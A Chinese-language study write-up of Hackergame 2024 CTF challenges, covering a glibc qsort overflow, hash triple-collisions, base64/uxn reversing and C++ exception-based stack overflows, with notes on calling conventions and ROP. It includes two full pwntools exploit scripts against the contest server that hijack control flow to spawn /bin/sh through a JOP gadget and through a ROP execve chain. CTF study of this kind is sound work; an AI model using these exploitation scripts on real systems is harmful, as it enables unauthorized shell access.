[官方wp](https://github.com/USTC-Hackergame/hackergame2024-writeups?tab=readme-ov-file)


## 1. 我们的快排确有问题
> 这道题目是唯一做出来的一道有一点难度的题，其他几道涉及的知识都不太懂，这道题使用了一个cve漏洞，是通过 *hackergame2023* 的一个题目得到启发
> 这个cve漏洞是网上查找，阅读漏洞的复现过程，得到漏洞使用方法，然后就能编写漏洞利用程序
> 漏洞很简单，就是glibc库里的qsort函数在使用非递归比较函数时，会发生溢出，但前提是输入很大，缓冲区不够用，以及malloc失效
> 这个漏洞在现实世界是比较难复现的，因为既要写一个非递归的比较，还要使得malloc实现
> 递归比较的意思就是，如果a>b,b>c,那么a>c
> 做这个题目的时候完整的阅读了一篇关于这个漏洞的研究，感觉很有意思
> 下面是题目源代码：
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/time.h>
#define MAX_STU_NUM 0x100

struct {
        int (*sort_func)(const void *const, const void *const);
        double temp_sort_array[MAX_STU_NUM];
} gms;

void *unused() { return NULL; }
void doredolaso() {
    __asm__("add rsp, 8;"
            "jmp [rsi];");
}
void why_theres_a_b4ckd00r_in_my_GMS() {
    puts("獎一個 🌸⌚️");
    system("echo 🌸⌚️");
}

void inits() {
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
}

void banner() {
    puts("===================================================");
    puts("        Our QuickSort Indeed Has Problems          ");
    puts("     gpasortings Ystemth At Utilizes quicksort     ");
    puts("===================================================");
}

void disable_malloc() {
    /* 我認為 malloc 應該被取消調用資格 */
    size_t puts_addr = (size_t)&puts;
    size_t malloc_hook_addr = puts_addr + 0x168750;
    *(size_t *)malloc_hook_addr = (size_t)&unused;
}

int whos_jipiei_is_better(const void *const pa, const void *const pb) {
    const double a = *(const double *)pa;
    const double b = *(const double *)pb;

    if (!a || !b) {
        return 0;
    }
    if (a < 2.5 || b < 2.5) {
        puts("With such grades, how can we sort them?");
        return -1;
    }
    if (a < b)
        return -1;
    if (a > b)
        return 1;
    return 0;
}

int main() {
    inits();
    banner();
    disable_malloc();

    int student_num;    
    char student_num2[0x28];

    puts("Enter student number:");
    scanf("%d", &student_num);
    if (student_num <= 0 || student_num > MAX_STU_NUM) {
        puts("That's too many students! We'll let someone else handle this.");
        return -1;
    }

    puts("Enter the GPA data:");
    for (int i = 0; i < student_num; i++) {
        scanf("%lf", &(gms.temp_sort_array[i]));
    }

    puts("Processing...");
    gms.sort_func = whos_jipiei_is_better;
    qsort(gms.temp_sort_array, student_num, sizeof(double), gms.sort_func);

    puts("Oops, sorting a wrong direction. Processing again...");
    for (int i = 0; i < student_num; i++) {
        scanf("%lf", &(gms.temp_sort_array[i]));
    }
    qsort(gms.temp_sort_array, student_num, sizeof(double), gms.sort_func);

    return 0;
}
```
> 这里意图其实很明显了，先是废了malloc，然后使用了一个非递归的比较函数，所以可以利用qsort修改结构体数组上面的compar函数,改为doredolaso的地址
> 填充进去system()的地址，然后第二次调用qsort的时候，会调用system函数，但是需要填充command，输入放到结构体数组的第一个元素上
> 漏洞利用的时候要注意填充比较多的输入，使得分配的缓冲区不够用，这就会使得发生溢出，最小的那个数会顶掉compar函数

### 学习一下pwn脚本的编写
> 做这题都是直接自己编输入的，比较笨拙，因为第一次做pwn题，下面来学习一下pwn脚本的编写
```python
#!/usr/bin/env python3

from pwn import *

# 设置pwntools库的上下文
context.log_level = "info"   # 将日志级别设置为 "info"，以便可以看到信息日志
context.arch = "amd64"       # 设置目标架构为amd64，表示目标系统是64位架构

# 连接到远程服务器
io = remote("202.38.93.141", 31341)   # 目标IP和端口，用于建立远程连接

# 定义需要使用的地址
JOP_gadget = 0x4011DD           # 控制流跳转的JOP (Jump-Oriented Programming) gadget地址
GET_my_hwatch_addr = 0x401201   # 用于获取手表（hwatch）信息的函数地址

# 接收一行数据（通常是服务器的欢迎消息或提示）
io.recvline()
# 提示用户输入令牌（token），将输入转换为字节并发送给服务器进行身份验证
io.sendline(input("Input your token: ").encode())


# 定义一个函数，将64位整数转换为双精度浮点数
def i64tof64(int_value):
    # 将整数转换为小端字节表示(小端字节表示是指低地址字节在前，就是说和普通阅读方式相反，用在许多处理器架构的存储中)，并再将其转换为双精度浮点数
    bytes_value = struct.pack("<Q", int_value)#pack用于将数据按照指定的格式编码成字节串，“<”表示使用小端字节序，“Q”表示64位无符号整数
    double_value = struct.unpack("<d", bytes_value)[0]#用于将字节串解码为指定格式的数据
    return double_value


# 定义一个函数，将双精度浮点数转换为64位整数
def f64toi64(double_value):
    # 将双精度浮点数转换为小端字节表示，再转换为64位整数
    bytes_value = struct.pack("<d", double_value)
    int_value = struct.unpack("<Q", bytes_value)[0]
    return int_value


# 等待接收到特定输入提示符
io.recvuntil(":\n".encode())
# 发送一个整数0x100，可能是发送数组大小的指令
io.sendline(str(0x100).encode())

# 构造一个包含256个浮点数的列表，初始值均为4.3
stu_list = [4.3 for i in range(0x100)]
# 将列表中的第16个元素设为JOP_gadget对应的浮点数，以覆盖该位置的数据并控制跳转地址
stu_list[0x10] = i64tof64(JOP_gadget)

# 等待接收到下一个输入提示符
io.recvuntil(":\n".encode())
# 依次发送stu_list中的每个浮点数值，逐个编码为字符串并发送
for i in stu_list:
    io.sendline(str(i).encode())

# 等待接收服务器的特定提示符
io.recvuntil(b"...\n")
# 将GET_my_hwatch_addr的浮点数值发送给服务器，用于触发指定函数的执行
io.sendline(str(i64tof64(GET_my_hwatch_addr)).encode())

# 接下来发送255次"/bin/sh"的浮点表示，以便传递可能执行shell的指令
for _ in range(0x100 - 1):
    # 将"/bin/sh"字符串转换为浮点数，编码为字符串并发送
    io.sendline(str(i64tof64(u64(b"/bin/sh\x00"))).encode())

# 进入交互模式，如果成功利用漏洞，将获得远程shell的访问权限
io.interactive()

```

***
***



## 2. hash三碰撞
> 这个题目只做了第一问，我以为自己是标准解，没想到是非预期解，题解中推荐使用ai将伪代码转化为代码，试一下：
```python
import hashlib

def hex_to_bin(hex_str):
    return bytes.fromhex(hex_str)

def main():
    # 读取输入
    s1 = [input(f"Data {i + 1}: ").strip() for i in range(3)]
    v12 = [hex_to_bin(s) for s in s1]

    # 确保输入合法并且不同
    assert all(len(s) <= 16 for s in s1) and len(set(s1)) == 3  #len(set(s1))用于检查列表中是否有重复元素,保证输入相同

    # 计算SHA-256哈希，并取后4字节生成整数
    v9, v10, v11 = [int.from_bytes(hashlib.sha256(v).digest()[:4], 'big') for v in v12]

    # 检查是否相等并输出结果
    if v9 == v10 == v11:
        with open("flag1", "r") as stream:
            print(stream.read())
    else:
        print("Wrong answer")

if __name__ == "__main__":
    main()

```
、

> 这道题我是根据比较的地方不同来实现的，前一个比较不同，比较的原输入，是区分大小写的，而sha256接受的输入是统一小写的，因此只要三个数据分别有几个大小写不同就可以了

> 题解竟然是硬解

```cpp
#include <iostream>
#include <unordered_map>
#include <vector>
#include <string>
#include <openssl/sha.h> // 需要安装 OpenSSL 库

int main() {
    uint64_t counter = 0;
    std::unordered_map<uint32_t, std::vector<std::string>> hash_map;

    while (true) {
        // 将计数器转换为 8 字节字符串
        char str[8];
        for (int i = 0; i < 8; ++i) {
            str[7 - i] = (counter >> (8 * i)) & 0xFF;
        }
        // 计算 SHA256 哈希
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256((unsigned char*)str, 8, hash);
        // 提取哈希值的后 4 个字节
        uint32_t last4bytes = 0;
        for (int i = 0; i < 4; ++i) {
            last4bytes = (last4bytes << 8) | hash[SHA256_DIGEST_LENGTH - 4 + i];
        }
        // 存入映射表
        std::string s(str, 8);
        hash_map[last4bytes].push_back(s);
        // 如果找到三个字符串，输出结果
        if (hash_map[last4bytes].size() == 3) {
            std::cout << "在尝试了 " << counter + 1 << " 次后找到三个字符串，它们的 SHA256 哈希值的后 4 个字节相同：" << std::endl;
            for (const auto& val : hash_map[last4bytes]) {
                // 以十六进制输出字符串
                for (unsigned char c : val) {
                    printf("%02x", (unsigned char)c);
                }
                std::cout << std::endl;
            }
            break;
        }
        counter++;
        if (counter % 1000000 == 0) {
            std::cout << "已尝试了 " << counter << " 个字符串。" << std::endl;
        }
    }

    return 0;
}

```

### 第二问用了区块链的知识
> 使用ai写一下精简版题目：
```python
import hashlib

def sha256(data):
    return hashlib.sha256(data).digest()

def hex_to_bin(hex_str):
    return bytes.fromhex(hex_str)

# 输入和初始化数据
input_data = input("Initial data: ").strip()
InitialData = hex_to_bin(input_data)
NoSalt = sha256(InitialData)

# 初始化加盐数据
Salt_12 = bytearray(NoSalt)
Salt_34 = bytearray(NoSalt)

for round_num in range(100):
    print(f"Round {round_num + 1}")
    
    # 输入四份盐并转换成二进制
    BinarySalt1 = hex_to_bin(input("Salt 1: ").strip())
    BinarySalt2 = hex_to_bin(input("Salt 2: ").strip())
    BinarySalt3 = hex_to_bin(input("Salt 3: ").strip())
    BinarySalt4 = hex_to_bin(input("Salt 4: ").strip())
    
    # 检查盐的长度
    assert len(BinarySalt1) == len(BinarySalt3)
    assert len(BinarySalt2) == len(BinarySalt4)
    
    # 混合数据并计算哈希
    MixingPlace1 = BinarySalt1 + Salt_12 + BinarySalt2
    Salt_12 = sha256(MixingPlace1)
    
    MixingPlace2 = BinarySalt3 + Salt_34 + BinarySalt4
    Salt_34 = sha256(MixingPlace2)
    
    # 检查哈希值是否不同
    assert Salt_12 != Salt_34, "Hash should be different"

# 最终检查
assert Salt_12[-8:] == Salt_34[-8:] == NoSalt[-8:], "Wrong answer"
print("Correct!")
```
> 然后是区块链知识 


*我们知道比特币等区块链使用的工作量证明算法就是两次 SHA-256，所以我们可以从区块链上寻找答案。随便拿来一个比特币的区块哈希，比如：*

*00000000000000000002043e95964c355bb333c071cfca0d74a5ae6ed59000df我们可以发现其前 9 个字节都是 0。去搜索一下比特币的区块哈希是如何计算的可以发现，其实这个区块哈希的字节序跟我们平时见到的 SHA-256 是相反的，所以这 9 个 0 字节实际上就是在最后，满足题目的要求。*

*比特币的区块头结构是 80 字节，其中包含上一个区块的哈希、当前区块的时间戳、当前区块所有交易的 Merkle Root 等等。而区块的哈希就是区块头这 80 字节的内容计算两次 SHA-256 的结果。*

*所以，题目中的这种加上前缀和后缀的计算，恰好可以用区块头中上一个区块的哈希左边和右边的数据来匹配。两次 SHA-256 的时候，第二次并不需要加前后缀，所以提交空串即可。*

*但是题目要求的是两条起点一样、中间并不重合的链，这要从哪里寻找呢？答案就是区块链的分叉。比特币在历史上有过几次硬分叉，最经典的就是比特币（Bitcoin，BTC）分叉为比特币现金（Bitcoin Cash，BCH）。*

*通过搜索，我们可以知道分叉的区块高度是 478558。我们把 BTC 和 BCH 两条链在区块高度 478558 附近的区块数据下载下来，然后处理一下，就可以构造出来题目所需的数据。理论上，其他分叉如果工作量证明的难度足够的话，也是同样可以用来解题的。*

> 超出知识范围了

### 第三问同样超出范围了，不做

## 3. 神秘代码2
> 第一问实在是奇葩：

出题人 R 是套娃 Misc（杂项）爱好者。据说，他在战队招新时出了一道有一千层套娃的 Misc 题目，包括但不限于：

    凯撒密码
    Base64 编码
    RFC 1751
    Zstandard
    xz
    bzip2
    zlib

最后以一个 Base64 编码大火收汁儿，名曰「神秘代码」。结果不出所料，这道题被其他所有人都骂惨了。

「这次 Hackergame 你不许出神秘代码了！」

出题人 R 想了想，以他的理解出了这道题目，毕竟没有人说不能出神秘代码 2 嘛！而且，既然是神秘代码 2，那我有两个「神秘代码」，不过分吧？

提示：

    这是一道逆向题目
    每一道题目会输出两行，第一行是 Base64 编码的字节码，第二行是代码运行结果
    代码的输入是 flag 经过 zlib 压缩后的结果，这次真的只有两层，不做千层饼了
    你可能是百度搜索的受害者
    我已经绞尽脑汁给你们提示了饶了我吧

> 第一行输出的字节码，长得很怪，搜遍全网，也没找到这种字节码，然后题解告诉我字节码后面的明文是打乱的base64字符表。。，这也能叫逆向题。。。
> 然后就换表base64，得到flag。。。。

### 第二题第三题要学习uxn
> 给出的是汇编字节码
*Tal是Uxn虚拟机的编程语言，Uxn程序是专门为此虚拟机设计的基于堆栈的汇编风格编写的。TAL是可读的源文件，rom文件是uxn兼容的二进制程序文件：*
*将TAL文件转换为ROM文件的应用程序称为Assemblers*


## 4. cat绿色破解版
> 这题主要卡在如何getshell上，因为题目说*你的目标是传入特定的数据，触发植入的后门*，以为题目里面有后门，但完全没有找到
> 题解是使用*ret2dl_resolve*来实现getshell的，需要学习一下ret2dlresolve的原理：

*静态链接：程序在编译时，编译器将所有需要的函数和变量都链接到一起，形成一个完整的可执行文件。*
*动态链接：程序在运行时，编译器并不将所有函数和变量链接到一起，而是将函数和变量的地址放在一个叫做动态链接库（Dynamic Link Library，DLL）的外部文件中，程序运行时才将这些函数和变量加载到内存中。*

**由于库中函数并不是所有都需要，Linux在程序第一次调用函数时才会将其装载程序**
**这就引入了PLT表，PLT表每个函数的第一项都是一个jmp至GOT表的操作，GOT表在函数被调用之前并不存放函数真实地址，而是PLT表write函数对应表项中push 0x20指令的位置，然后再跳一次，压一个参数，再跳，便是_dl_runtime_resolve(link_map, reloc_arg)函数，之前的两个参数就提供给这个函数**

*.rel.plt表：ELF（Executable and Linkable Format）文件格式中的一个重定位表，用于支持延迟绑定（Lazy Binding）功能。它主要用于动态链接库（如 .so 文件）调用的符号重定位。*
*.rel.plt 表保存了程序运行时需要重定位的函数入口的信息，通常包含了目标函数的符号地址和一些重定位信息。这些重定位信息允许程序在首次调用外部函数时，动态地从共享库中加载函数的真实地址，并填充到 .plt（Procedure Linkage Table）中，使后续的调用可以直接跳转到该地址，避免重复的重定位操作。*

**上文的0x20便是提供给.rel.plt表的偏移，这个地方是reloc的位置**

***算了以后再学pwn***

## 5. RISC-V:
> 这是个汇编编程题


## 6. 零解题
> 静态编译，不存在PIE保护（Position Independent Executable）
> 第一题是比较传统的栈溢出，利用栈溢出破坏throw的返回地址，引导去try块
*知识点：C++异常机制*
**当程序执行到throw语句时，会开始异常处理流程**
**异常处理机制会沿着调用栈向上查找，寻找匹配的catch块**
**一旦找到匹配的catch块，程序会跳到该块，执行其中的代码**

*如何定位catch块*
**编译器在编译时产生异常处理表，包含每个可能抛出异常的代码段对应的try-catch块**
**异常抛出之后，看当前指令地址是否有对应的catch块，没有就向前一个栈帧查找**

> 所以vuln可以直接把异常抛出给banner的catch块

题解：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   作者：@eastXueLian

from pwn import *

# 设置日志等级和架构
context.log_level = "info"
context.arch = "amd64"

# 连接到远程服务
io = remote("202.38.93.141", 31335)

# 辅助函数
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))  # 将数据转换为64位无符号整数
i2b = lambda c: str(c).encode()  # 将整数转换为字节串

# 接收提示并发送令牌
io.recvuntil(b":")
io.sendline(input("请输入你的令牌：").encode())  # 提示用户输入令牌并发送

# 定义发送有效负载的函数
def send_payload(payload):
    # 将有效负载拆分为8字节一组的整数列表
    payload_list = [0 for _ in range(len(payload) // 8 + 1)]#创建一个长度为 len(payload) // 8 + 1 的列表，列表中的每个元素都是 0
    for i in range(0, len(payload), 8):
        payload_list[i // 8] = u64_ex(payload[i:i+8])
    data = b""
    # 将每个整数转换为字节串并用空格分隔
    for i in payload_list:
        data += i2b(i)
        data += b" "
    # 发送数据，末尾添加特殊值0x31337并换行
    io.send(data + i2b(0x31337) + b"\n")
    # 接收直到提示下一轮开始
    io.recvuntil(b"next round has begun.\n")

# 等待初始提示
io.recvuntil(b"stop reading until I receive the correct one.")
# 发送初始有效负载，用于对齐或设置环境
send_payload(b"a")

# 定义一些关键地址和值
try_addr = 0x0000000000401F0E      
# 'banner'函数的try块地址
new_stack = 0x31337000             
# 新的栈地址，用于栈迁移(源代码中提供了一个栈地址区间，这里取了范围之内的一个地址)：覆盖rbp，使得函数返回时，rsp被设置为new_stack，实现栈迁移
pop_rdi_ret = 0x0000000000402F7C   # ROP小工具：pop rdi; ret
pop_rsi_ret = 0x0000000000404669   # ROP小工具：pop rsi; ret
pop_rdx_2_ret = 0x00000000004AF0DB # ROP小工具：pop rdx; pop rbx; ret
pop_rax_ret = 0x0000000000463DA7   # ROP小工具：pop rax; ret
syscall_ret = 0x42EA86             # ROP小工具：syscall; ret

# 构造第一个有效负载，实现栈迁移
payload = flat(                 #flat() 函数：pwntools 库中的一个函数，用于将嵌套的数据结构（如列表、字典）扁平化为字节串，自动处理数据的端序和填充
    {
        0x00: [0x1111, 0x2222, 0x3333, 0x4444, new_stack],  # 覆盖保存的RBP为new_stack
        0x28: [try_addr + 1, 0xDEADBEEF, 0xCAFECAFE, 0x31337],  # 覆盖返回地址等
    }
)
# 发送第一个有效负载
send_payload(payload)

# 构造第二个有效负载，包含ROP链
payload = flat(
    {
        0x00: [u64_ex(b"/bin/sh\x00"), 0x2222, 0x3333, 0x4444, new_stack + 0x10],  # 准备数据并调整RBP
        0x28: [
            try_addr + 1,        # 再次覆盖返回地址到'banner'函数的try块
            0x4DE4B0,            # 占位符或特定地址（可能用于对齐）
            pop_rdi_ret,         # 设置RDI寄存器
            0x31336FE0,          # 指向"/bin/sh\x00"字符串的地址
            pop_rsi_ret,         # 设置RSI寄存器
            0,                   # RSI设为0（NULL）
            pop_rdx_2_ret,       # 设置RDX和另一个寄存器
            0x31337010,          # RDX的值（可能为NULL或特定值）
            0,                   # 第二个弹出的寄存器值（如RBX）
            pop_rax_ret,         # 设置RAX寄存器
            0x3B,                # 系统调用号59，表示execve
            syscall_ret,         # 触发系统调用
        ],
    }
)
# 发送第二个有效负载
send_payload(payload)

# 进入交互模式，与shell交互
io.interactive()

```

## 零解题2
> 这个题使用了Intel CET提供的影子栈保护




### 总结
> 入栈顺序：
1. Windows x64 Calling Convention
   - 前四个整型参数分别是rcx, rdx, r8, r9传递
   - 前四个浮点参数分别是xmm0, xmm1, xmm2, xmm3传递
   - 其他参数通过栈传递，从右往左依次入栈
   - 返回值通过rax返回

2. System V x64 Calling Convention（Linux/macOS）
   - 前六个整型参数分别是rdi, rsi, rdx, rcx, r8, r9传递
   - 前八个浮点参数分别是xmm0, xmm1, xmm2, xmm3, xmm4, xmm5, xmm6, xmm7传递
   - 超过六个参数的其他参数通过栈传递，从右往左依次入栈
   - 返回值通过rax返回或者rdx:rax返回（用于返回两个整数值的情况）

3. x86（32位）
   - 所有参数通过栈传递，从右往左依次入栈

>ROP小工具（Gadget）：
- 程序或其依赖库中已存在的短代码片段，通常以ret指令结尾，可以用来构造ROP链
- 常见的ROP小工具：
  - pop rdi; ret：将栈顶数据弹出到rdi寄存器
  - pop rsi; ret：将栈顶数据弹出到rsi寄存器
**c3== ret**
**5d== pop rbp**
**5e== pop rsi**

> 列表推导式创建一个列表
**[表达式 for 变量 in 可迭代对象]**

> Payload:有效负载，通常指的是发送到目标系统的数据

> lambda表达式语法：产生两个辅助函数变换数据形式
**u64_ex = lambda data: u64(data.ljust(8, b"\x00"))**
**i2b = lambda c: str(c).encode()**

> 字节串和字符串可以相互转化
**str.encode()：字符串转字节串**
**bytes.decode()：字节串转字符串**